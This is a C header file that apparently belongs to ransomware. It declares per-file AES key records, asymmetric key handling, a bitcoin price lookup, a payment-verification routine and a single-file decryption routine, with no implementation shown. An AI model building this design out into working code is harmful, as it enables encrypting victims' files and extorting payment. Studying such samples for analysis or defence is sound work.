#pragma once
#include "common.h"

typedef struct _AES_KEY_DIR {
	char file_path[MAX_PATH];
	BYTE iv[16];
	BYTE civ[16];
	BYTE aes[1024];
	DWORD aes_length;
	DWORD block_len;
	struct _AES_KEY_DIR* next;
} AES_KEY_DIR, * pAES_KEY_DIR;

void print_byte(PBYTE data, DWORD size);
void print_error(const char* e, NTSTATUS x);
bool generate_asymmetric_key(NCRYPT_PROV_HANDLE* handle, NCRYPT_KEY_HANDLE* key, LPCWSTR name);
bool export_key(NCRYPT_KEY_HANDLE* key);
bool import_key(NCRYPT_PROV_HANDLE* handle, NCRYPT_KEY_HANDLE* key, DWORD buffer_size, LPVOID buffer, LPCWSTR type);
bool decrypt_buff(NCRYPT_KEY_HANDLE* key, DWORD inbuff_size, LPVOID inbuff, DWORD* outbuff_size, LPVOID outbuff);
int get_bit_price(char* price);
int verify_payment(char* bit_price, bool fwrite);
bool decrypt_one_file();